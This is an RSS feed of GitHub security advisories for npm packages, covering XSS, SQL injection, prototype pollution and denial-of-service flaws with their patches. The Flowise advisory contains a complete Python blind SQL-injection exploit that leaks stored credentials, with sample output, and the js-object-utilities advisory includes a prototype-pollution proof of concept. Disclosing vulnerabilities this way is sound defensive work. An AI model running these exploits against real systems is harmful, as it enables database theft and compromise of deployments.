<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-04-09T21:01:12.623Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[koa] Koajs vulnerable to Cross-Site Scripting (XSS) at ctx.redirect() function]]></title>
        <id>https://github.com/advisories/GHSA-x2rg-q646-7m2v</id>
        <link href="https://github.com/advisories/GHSA-x2rg-q646-7m2v"/>
        <updated>2025-04-09T20:29:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In koa &lt; 2.16.1 and &lt; 3.0.0-alpha.5, passing untrusted user input to ctx.redirect() even after sanitizing it, may execute javascript code on the user who use the app.</p>
<h3 id="patches">Patches</h3>
<p>This issue is patched in  2.16.1 and 3.0.0-alpha.5.</p>
<h3 id="poc">PoC</h3>
<p>Coming soon...</p>
<h3 id="impact">Impact</h3>
<ol>
<li>Redirect user to another phishing site</li>
<li>Make request to another endpoint of the application based on user's cookie</li>
<li>Steal user's cookie</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koajs/koa/security/advisories/GHSA-x2rg-q646-7m2v">https://github.com/koajs/koa/security/advisories/GHSA-x2rg-q646-7m2v</a></li>
<li><a href="https://github.com/koajs/koa/commit/ff25eb4a7f2392df46481fe86355161067687312">https://github.com/koajs/koa/commit/ff25eb4a7f2392df46481fe86355161067687312</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32379">https://nvd.nist.gov/vuln/detail/CVE-2025-32379</a></li>
<li><a href="https://github.com/advisories/GHSA-x2rg-q646-7m2v">https://github.com/advisories/GHSA-x2rg-q646-7m2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x2rg-q646-7m2v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-09T13:00:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[koa] Koajs vulnerable to Cross-Site Scripting (XSS) at ctx.redirect() function]]></title>
        <id>https://github.com/advisories/GHSA-x2rg-q646-7m2v</id>
        <link href="https://github.com/advisories/GHSA-x2rg-q646-7m2v"/>
        <updated>2025-04-09T20:29:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In koa &lt; 2.16.1 and &lt; 3.0.0-alpha.5, passing untrusted user input to ctx.redirect() even after sanitizing it, may execute javascript code on the user who use the app.</p>
<h3 id="patches">Patches</h3>
<p>This issue is patched in  2.16.1 and 3.0.0-alpha.5.</p>
<h3 id="poc">PoC</h3>
<p>Coming soon...</p>
<h3 id="impact">Impact</h3>
<ol>
<li>Redirect user to another phishing site</li>
<li>Make request to another endpoint of the application based on user's cookie</li>
<li>Steal user's cookie</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koajs/koa/security/advisories/GHSA-x2rg-q646-7m2v">https://github.com/koajs/koa/security/advisories/GHSA-x2rg-q646-7m2v</a></li>
<li><a href="https://github.com/koajs/koa/commit/ff25eb4a7f2392df46481fe86355161067687312">https://github.com/koajs/koa/commit/ff25eb4a7f2392df46481fe86355161067687312</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32379">https://nvd.nist.gov/vuln/detail/CVE-2025-32379</a></li>
<li><a href="https://github.com/advisories/GHSA-x2rg-q646-7m2v">https://github.com/advisories/GHSA-x2rg-q646-7m2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x2rg-q646-7m2v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-09T13:00:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[crud-query-parser] crud-query-parser SQL Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-9r25-rp3p-h2w4</id>
        <link href="https://github.com/advisories/GHSA-9r25-rp3p-h2w4"/>
        <updated>2025-04-09T12:57:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper neutralization of the <code>order</code>/<code>sort</code> parameter in the TypeORM adapter, which allows SQL injection.</p>
<p>You are impacted by this vulnerability if you are using the TypeORM adapter, ordering is enabled and you have not set-up a property filter.</p>
<p>Versions 0.0.1, 0.0.2 and 0.0.3 are affected by this vulnerability.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been fixed in version 0.1.0 and newer, which introduces TypeORM field validation (enabled by default).</p>
<h3 id="workarounds">Workarounds</h3>
<h4 id="add-an-allowlist-of-fields">Add an allowlist of fields</h4>
<p>List all valid fields and use the <code>filterProperties</code> function to filter out invalid fields before passing the crudRequest to the <code>TypeOrmQueryAdapter</code>. Here's an example:</p>
<pre><code class="language-ts">crudRequest = filterProperties(crudRequest, ['id', 'title', 'category.name']);
</code></pre>
<h4 id="disable-ordering">Disable ordering</h4>
<p>Cleanup the <code>order</code> field just before passing it to the <code>TypeOrmQueryAdapter</code>. Here's an example:</p>
<pre><code class="language-ts">crudRequest.order = [];
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Guichaguri/crud-query-parser/security/advisories/GHSA-9r25-rp3p-h2w4">https://github.com/Guichaguri/crud-query-parser/security/advisories/GHSA-9r25-rp3p-h2w4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32020">https://nvd.nist.gov/vuln/detail/CVE-2025-32020</a></li>
<li><a href="https://github.com/advisories/GHSA-9r25-rp3p-h2w4">https://github.com/advisories/GHSA-9r25-rp3p-h2w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r25-rp3p-h2w4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-09T12:57:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@apeleghq/asn1-der] ts-asn1-der has Incorrect DER Encoding of Numbers Leading to Denial of Service and Incorrect Value Representation]]></title>
        <id>https://github.com/advisories/GHSA-p4qw-7j9g-5h53</id>
        <link href="https://github.com/advisories/GHSA-p4qw-7j9g-5h53"/>
        <updated>2025-04-08T17:49:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Incorrect <code>number</code> DER encoding can lead to denial on service for absolute values in the range <code>2**31</code> -- <code>2**32 - 1</code>. The arithmetic in the <code>numBitLen</code> didn't take into account that values in this range could result in a negative result upon applying the <code>&gt;&gt;</code> operator, leading to an infinite loop.</p>
<p>In addition, <code>number</code> encoding had a few other issues that resulted it in it not encoding values correctly.</p>
<h3 id="patches">Patches</h3>
<p>The issue is patched in version <code>1.0.4</code>. Users are recommended to upgrade as soon as possible.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not an option, the issue can be mitigated by validating inputs to <code>Asn1Integer</code> to ensure that they are not smaller than <code>-2**31 + 1</code> and no larger than <code>2**31 - 1</code>. Although <code>Asn1Integer</code> supports <code>bigint</code> inputs, some additional implementation issues make using <code>bigint</code> as a mitigation inviable, as it will result in incorrect values.</p>
<p>If upgrading is not an option and range checks are impractical or undesirable, input to <code>Asn1Integer</code> can be provided as a buffer to be used directly. Note that this requires computing the correct DER encoding externally.</p>
<h3 id="references">References</h3>
<p>N/A</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ApelegHQ/ts-asn1-der/security/advisories/GHSA-p4qw-7j9g-5h53">https://github.com/ApelegHQ/ts-asn1-der/security/advisories/GHSA-p4qw-7j9g-5h53</a></li>
<li><a href="https://github.com/ApelegHQ/ts-asn1-der/commit/b2bc9032cbe19755d234a27d79e47a7e52993af8">https://github.com/ApelegHQ/ts-asn1-der/commit/b2bc9032cbe19755d234a27d79e47a7e52993af8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32029">https://nvd.nist.gov/vuln/detail/CVE-2025-32029</a></li>
<li><a href="https://github.com/advisories/GHSA-p4qw-7j9g-5h53">https://github.com/advisories/GHSA-p4qw-7j9g-5h53</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p4qw-7j9g-5h53</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-07T21:11:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[estree-util-value-to-estree] estree-util-value-to-estree allows prototype pollution in generated ESTree]]></title>
        <id>https://github.com/advisories/GHSA-f7f6-9jq7-3rqj</id>
        <link href="https://github.com/advisories/GHSA-f7f6-9jq7-3rqj"/>
        <updated>2025-04-07T19:09:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When generating an ESTree from a value with a property named <code>__proto__</code>, <code>valueToEstree</code> would generate an object that specifies a prototype instead.</p>
<p>Example:</p>
<pre><code class="language-js">import { generate } from 'astring'
import { valueToEstree } from 'estree-util-value-to-estree'

const estree = valueToEstree({
  ['__proto__']: {}
})
const code = generate(estree)
console.log(code)
</code></pre>
<p>Output:</p>
<pre><code class="language-js">{
  "__proto__": {}
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>This was fixed in version <a href="https://github.com/remcohaszing/estree-util-value-to-estree/releases/tag/v3.3.3">3.3.3</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you control the input, don’t specify a property named <code>__proto__</code>. If you don’t control the output, strip any properties named <code>__proto__</code> before passing it to <code>valueToEstree</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/remcohaszing/estree-util-value-to-estree/security/advisories/GHSA-f7f6-9jq7-3rqj">https://github.com/remcohaszing/estree-util-value-to-estree/security/advisories/GHSA-f7f6-9jq7-3rqj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32014">https://nvd.nist.gov/vuln/detail/CVE-2025-32014</a></li>
<li><a href="https://github.com/remcohaszing/estree-util-value-to-estree/commit/d0c394fbc64bc55937ffe4e162b81f15ba506e55">https://github.com/remcohaszing/estree-util-value-to-estree/commit/d0c394fbc64bc55937ffe4e162b81f15ba506e55</a></li>
<li><a href="https://github.com/advisories/GHSA-f7f6-9jq7-3rqj">https://github.com/advisories/GHSA-f7f6-9jq7-3rqj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f7f6-9jq7-3rqj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-07T19:09:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@apollo/gateway] Apollo Gateway Query Planner Vulnerable to Excessive Resource Consumption via Optimization Bypass]]></title>
        <id>https://github.com/advisories/GHSA-p2q6-pwh5-m6jr</id>
        <link href="https://github.com/advisories/GHSA-p2q6-pwh5-m6jr"/>
        <updated>2025-04-08T17:51:03.000Z</updated>
        <content type="html"><![CDATA[<h1 id="impact">Impact</h1>
<h2 id="summary">Summary</h2>
<p>A vulnerability in Apollo Gateway allowed queries with deeply nested and reused named fragments to be prohibitively expensive to query plan, specifically due to internal optimizations being frequently bypassed. This could lead to excessive resource consumption and denial of service.</p>
<h2 id="details">Details</h2>
<p>The query planner includes an optimization that significantly speeds up planning for applicable GraphQL selections. However, queries with deeply nested and reused named fragments can generate many selections where this optimization does not apply, leading to significantly longer planning times. Because the query planner does not enforce a timeout, a small number of such queries can render gateway inoperable.</p>
<h2 id="fixmitigation">Fix/Mitigation</h2>
<ul>
<li>A new <strong>Query Optimization Limit</strong> metric has been added:<ul>
<li>This metric approximates the number of selections that cannot be skipped by the existing optimization.</li>
<li>The metric is checked against a limit to prevent excessive computation.</li>
</ul>
</li>
</ul>
<p>Given the complexity of query planning optimizations, we will continue refining these solutions based on real-world performance and accuracy tests.</p>
<h1 id="patches">Patches</h1>
<p>This has been remediated in <code>@apollo/gateway</code> version 2.10.1.</p>
<h1 id="workarounds">Workarounds</h1>
<p>No known direct workarounds exist.</p>
<h1 id="references">References</h1>
<p><a href="https://www.apollographql.com/docs/graphos/reference/federation/query-plans">Query Planning Documentation</a></p>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>We appreciate the efforts of the security community in identifying and improving the performance and security of query planning mechanisms.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/apollographql/federation/security/advisories/GHSA-p2q6-pwh5-m6jr">https://github.com/apollographql/federation/security/advisories/GHSA-p2q6-pwh5-m6jr</a></li>
<li><a href="https://github.com/apollographql/federation/pull/3236">https://github.com/apollographql/federation/pull/3236</a></li>
<li><a href="https://github.com/apollographql/federation/releases/tag/%40apollo%2Fgateway%402.10.1">https://github.com/apollographql/federation/releases/tag/%40apollo%2Fgateway%402.10.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32031">https://nvd.nist.gov/vuln/detail/CVE-2025-32031</a></li>
<li><a href="https://github.com/advisories/GHSA-p2q6-pwh5-m6jr">https://github.com/advisories/GHSA-p2q6-pwh5-m6jr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2q6-pwh5-m6jr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-07T19:03:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@apollo/gateway] Apollo Gateway Query Planner Vulnerable to Excessive Resource Consumption via Named Fragment Expansion]]></title>
        <id>https://github.com/advisories/GHSA-q2f9-x4p4-7xmh</id>
        <link href="https://github.com/advisories/GHSA-q2f9-x4p4-7xmh"/>
        <updated>2025-04-08T17:51:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="impact">Impact</h1>
<h2 id="summary">Summary</h2>
<p>A vulnerability in Apollo Gateway allowed queries with deeply nested and reused named fragments to be prohibitively expensive to query plan, specifically during named fragment expansion. This could lead to excessive resource consumption and denial of service.</p>
<h2 id="details">Details</h2>
<p>Named fragments were being expanded once per fragment spread during query planning, leading to exponential resource usage when deeply nested and reused fragments were involved.</p>
<h2 id="fixmitigation">Fix/Mitigation</h2>
<p>A new <strong>Query Fragment Expansion Limit</strong> metric has been introduced:</p>
<ul>
<li>This metric computes the number of selections a query would have if its fragment spreads were fully expanded.</li>
<li>The metric is checked against a limit to prevent excessive computation.</li>
</ul>
<h1 id="patches">Patches</h1>
<p>This has been remediated in <code>@apollo/gateway</code> version 2.10.1.</p>
<h1 id="workarounds">Workarounds</h1>
<p>No known direct workarounds exist.</p>
<h1 id="references">References</h1>
<p><a href="https://www.apollographql.com/docs/graphos/reference/federation/query-plans">Query Planning Documentation</a></p>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>We appreciate the efforts of the security community in identifying and improving the performance and security of query planning mechanisms.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/apollographql/federation/security/advisories/GHSA-q2f9-x4p4-7xmh">https://github.com/apollographql/federation/security/advisories/GHSA-q2f9-x4p4-7xmh</a></li>
<li><a href="https://github.com/apollographql/federation/pull/3236">https://github.com/apollographql/federation/pull/3236</a></li>
<li><a href="https://github.com/apollographql/federation/releases/tag/%40apollo%2Fgateway%402.10.1">https://github.com/apollographql/federation/releases/tag/%40apollo%2Fgateway%402.10.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32030">https://nvd.nist.gov/vuln/detail/CVE-2025-32030</a></li>
<li><a href="https://github.com/advisories/GHSA-q2f9-x4p4-7xmh">https://github.com/advisories/GHSA-q2f9-x4p4-7xmh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q2f9-x4p4-7xmh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-07T19:03:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseDB vulnerable to SQL Injection by authenticated users]]></title>
        <id>https://github.com/advisories/GHSA-9c4c-g95m-c8cp</id>
        <link href="https://github.com/advisories/GHSA-9c4c-g95m-c8cp"/>
        <updated>2025-04-07T18:55:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>import functions are vulnerable.</p>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/chatflows/index.ts#L219">importChatflows</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/tools/index.ts#L85">importTools</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/variables/index.ts">importVariables</a></li>
</ul>
<h3 id="details">Details</h3>
<p><strong>Authenticated user</strong> can call importChatflows API, import json file such as <code>AllChatflows.json</code>.
but Due to insufficient validation to chatflow.id in importChatflows API, 2 issues arise.</p>
<p><strong>Issue 1 (Bug Type)</strong></p>
<ol>
<li>Malicious user creates <code>AllChatflows.json</code> file by adding <code>../</code> and arbitrary path to the chatflow.id of the json file.<pre><code class="language-json">{
  "Chatflows": [
    {
      "id": "../../../../../../apikey",
      "name": "clickme",
      "flowData": "{}"
    }
  ]
}
</code></pre>
</li>
<li>Victim download this file, and import this to flowise.</li>
<li>When victim click created chatflow, victim access to flowise:3000/canvas/{chatflow.id}.</li>
</ol>
<p><strong>Issue 2 (Vulnerability Type)</strong>
importChatflows API use unsafe SQL Query.</p>
<pre><code class="language-javascript">// packages/server/src/services/chatflows/index.ts
const importChatflows = async (newChatflows: Partial&lt;ChatFlow&gt;[]): Promise&lt;any&gt; =&gt; {
        try {
        const appServer = getRunningExpressApp()

        // step 1 - check whether file chatflows array is zero
        if (newChatflows.length == 0) return

        // step 2 - check whether ids are duplicate in database
        let ids = '('
        let count: number = 0
        const lastCount = newChatflows.length - 1
        newChatflows.forEach((newChatflow) =&gt; {
            ids += `'${newChatflow.id}'`           // &lt;===== user input
            if (lastCount != count) ids += ','
            if (lastCount == count) ids += ')'
            count += 1
        })

        const selectResponse = await appServer.AppDataSource.getRepository(ChatFlow)
            .createQueryBuilder('cf')
            .select('cf.id')
            .where(`cf.id IN ${ids}`)                   // &lt;===== here
            .getMany()
        const foundIds = selectResponse.map((response) =&gt; {
            return response.id
        })
</code></pre>
<p>It changes like <code>SELECT cf.id FROM cf WHERE cf.id IN ('{USER-INPUT...}')</code> by the code above.
When  <code>') {Malicious SQL Query} --</code> is passed to newChatflow.id, SQL Injection occurs.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">import argparse
import requests


def import_chatflows(
    url: str,
    token: str,
    payload: dict
):
    response = requests.post(
        f'{url}/api/v1/chatflows/importchatflows',
        headers={
            'Authorization': f'Bearer {token}'
            # 'Authorization': f'Basic {token}'
        },
        json=payload
    )

    return response.json()


def import_normal_data(
    api_url: str,
    token: str,
    normal_data: str
):
    data_id = 'aaaaaa'

    payload = {
        "Chatflows": [
            {
                "id": data_id,
                "name": normal_data,
                "flowData": "{}"
            }
        ]
    }

    import_chatflows(
        url=api_url,
        token=token,
        payload=payload
    )
    return data_id


def get_character(
    api_url: str,
    token: str,
    data_id: str,
    column_name: str,
    index: int
):
    injection_query = f'(SELECT ascii(substr({column_name},{index},1)) FROM credential limit 0,1)'

    def create_payload(
        c: int
    ):
        return f"{data_id}') and if (({injection_query})&lt;{c}, 0, 9e300 * 9e300); -- "

    chatflows_json = {
        "Chatflows": [
            {
                "id": "",
                "name": data_id,
                "flowData": "{}"
            }
        ]
    }

    bitbox = [
        64, 32, 16, 8, 4, 2, 1
    ]
    character = 0
    for bit in bitbox:
        payload = create_payload(c=character + bit)
        chatflows_json['Chatflows'][0]['id'] = payload

        res = import_chatflows(
            url=api_url,
            token=token,
            payload=chatflows_json
        )
        if 'DOUBLE value is out of range' in res['message']:
            # character is more then bit
            character += bit
        else:
            # character is less then bit
            character += 0

    return chr(character)


def get_length(
    api_url: str,
    token: str,
    data_id: str,
    column_name: str
):
    injection_query = f'(SELECT length({column_name}) FROM credential limit 0,1)'

    def create_payload(
        c: int
    ):
        return f"{data_id}') and if (({injection_query})&lt;{c}, 0, 9e300 * 9e300); -- "

    chatflows_json = {
        "Chatflows": [
            {
                "id": "",
                "name": data_id,
                "flowData": "{}"
            }
        ]
    }

    column_len = 0
    bitbox = [
        256, 128, 64, 32, 16, 8, 4, 2, 1
    ]
    for bit in bitbox:
        payload = create_payload(c=column_len + bit)
        chatflows_json['Chatflows'][0]['id'] = payload

        res = import_chatflows(
            url=api_url,
            token=token,
            payload=chatflows_json
        )
        if 'DOUBLE value is out of range' in res['message']:
            # column_len is more then bit
            column_len += bit
        else:
            # column_len is less then bit
            column_len += 0

    return column_len


def main(
    url: str,
    token: str
):
    api_url = url

    column_box = [
        'credentialName',
        'encryptedData'
    ]

    data_id = import_normal_data(
        api_url=api_url,
        token=token,
        normal_data='flow01'
    )

    for column_name in column_box:
        column_len = get_length(
            api_url=api_url,
            token=token,
            data_id=data_id,
            column_name=column_name
        )

        print(f'[+] {column_name} length is {column_len}')

        result = ''
        for i in range(column_len):
            result += get_character(
                api_url=api_url,
                token=token,
                data_id=data_id,
                column_name=column_name,
                index=i + 1
            )

        print(f'[+] {column_name}: {result}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '--url',
        type=str,
        default='http://flowise:3000'
    )
    parser.add_argument(
        '--access',
        type=str,
        required=True,
        help='Get from http://flowise:3000/apikey'
    )

    m_args = parser.parse_args()

    main(
        url=m_args.url,
        token=m_args.access
    )
</code></pre>
<p><strong>poc results: encryptedData from flowise database credential table was successfully leaked.</strong></p>
<pre><code>/app # python ex2.py --url http://flowise:3000 --access "blahblah~~~"
[+] credentialName length is 9
[+] credentialName: openAIApi
[+] encryptedData length is 88
[+] encryptedData: U2FsdGVkX19LlIhbD4M9q9reLWQilBY6ffWo2S9PQ669CP1HpMPa5g1h1rJL0ZK3x0UMsLi/8Pz6TbSFrmIZbg==
</code></pre>
<p>It is recommended to limit all chatflow ids &amp; chat ids to UUID.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Database leak</li>
<li>Lateral Movement</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9c4c-g95m-c8cp">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9c4c-g95m-c8cp</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/4226">https://github.com/FlowiseAI/Flowise/pull/4226</a></li>
<li><a href="https://github.com/advisories/GHSA-9c4c-g95m-c8cp">https://github.com/advisories/GHSA-9c4c-g95m-c8cp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9c4c-g95m-c8cp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-07T18:55:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[js-object-utilities] js-object-utilities Vulnerable to Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-hpqf-m68j-2pfx</id>
        <link href="https://github.com/advisories/GHSA-hpqf-m68j-2pfx"/>
        <updated>2025-04-07T18:52:05.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Affected Package:</strong></p>
<ul>
<li>Product: js-object-utilities</li>
<li>Version: 2.2.0</li>
</ul>
<p><strong>Remedy:</strong></p>
<p>Update package to version 2.2.1.</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js">at module.exports (/node_modules/js-object-utilities/dist/set.js:16:29)
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>js-object-utilities (2.2.0)</code>, (previous versions are also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>lib.set</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install js-object-utilities@2.2.0
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('js-object-utilities');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        Reflect.apply(lib.set, {}, [someObj, "__proto__.pollutedKey", 123]);
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>Reporter Credit:</strong></p>
<p>Tariq Hawis</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rrainn/js-object-utilities/security/advisories/GHSA-hpqf-m68j-2pfx">https://github.com/rrainn/js-object-utilities/security/advisories/GHSA-hpqf-m68j-2pfx</a></li>
<li><a href="https://github.com/rrainn/js-object-utilities/commit/05ca694207270b7de275767f3fc93a2a643692a7">https://github.com/rrainn/js-object-utilities/commit/05ca694207270b7de275767f3fc93a2a643692a7</a></li>
<li><a href="https://github.com/advisories/GHSA-hpqf-m68j-2pfx">https://github.com/advisories/GHSA-hpqf-m68j-2pfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hpqf-m68j-2pfx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-07T18:52:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tarteaucitronjs] tarteaucitron.js allows url scheme injection via unfiltered inputs]]></title>
        <id>https://github.com/advisories/GHSA-p5g4-v748-6fh8</id>
        <link href="https://github.com/advisories/GHSA-p5g4-v748-6fh8"/>
        <updated>2025-04-07T16:47:00.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in <code>tarteaucitron.js</code>, allowing a user with high privileges (access to the site's source code or a CMS plugin) to enter a URL containing an insecure scheme such as <code>javascript:alert()</code>. Before the fix, URL validation was insufficient, which could allow arbitrary JavaScript execution if a user clicked on a malicious link.</p>
<h2 id="impact">Impact</h2>
<p>An attacker with high privileges could insert a link exploiting an insecure URL scheme, leading to:</p>
<ul>
<li>Execution of arbitrary JavaScript code</li>
<li>Theft of sensitive data through phishing attacks</li>
<li>Modification of the user interface behavior</li>
</ul>
<h2 id="fix-httpsgithubcomamaurictarteaucitronjscommit2fa1e01023bce2e4b813200600bb1619d56ceb02">Fix <a href="https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02">https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02</a></h2>
<p>The issue was resolved by enforcing strict URL validation, ensuring that they start with <code>http://</code> or <code>https://</code> before being used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-p5g4-v748-6fh8">https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-p5g4-v748-6fh8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31476">https://nvd.nist.gov/vuln/detail/CVE-2025-31476</a></li>
<li><a href="https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02">https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02</a></li>
<li><a href="https://github.com/advisories/GHSA-p5g4-v748-6fh8">https://github.com/advisories/GHSA-p5g4-v748-6fh8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p5g4-v748-6fh8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-07T16:46:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tarteaucitronjs] tarteaucitron.js allows prototype pollution via custom text injection]]></title>
        <id>https://github.com/advisories/GHSA-4hwx-xcc5-2hfc</id>
        <link href="https://github.com/advisories/GHSA-4hwx-xcc5-2hfc"/>
        <updated>2025-04-07T16:38:54.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in <code>tarteaucitron.js</code>, where the <code>addOrUpdate</code> function, used for applying custom texts, did not properly validate input. This allowed an attacker with direct access to the site's source code or a CMS plugin to manipulate JavaScript object prototypes, leading to potential security risks such as data corruption or unintended code execution.</p>
<h2 id="impact">Impact</h2>
<p>An attacker with high privileges could exploit this vulnerability to:</p>
<ul>
<li>Modify object prototypes, affecting core JavaScript behavior,</li>
<li>Cause application crashes or unexpected behavior,</li>
<li>Potentially introduce further security vulnerabilities depending on the application's architecture.</li>
</ul>
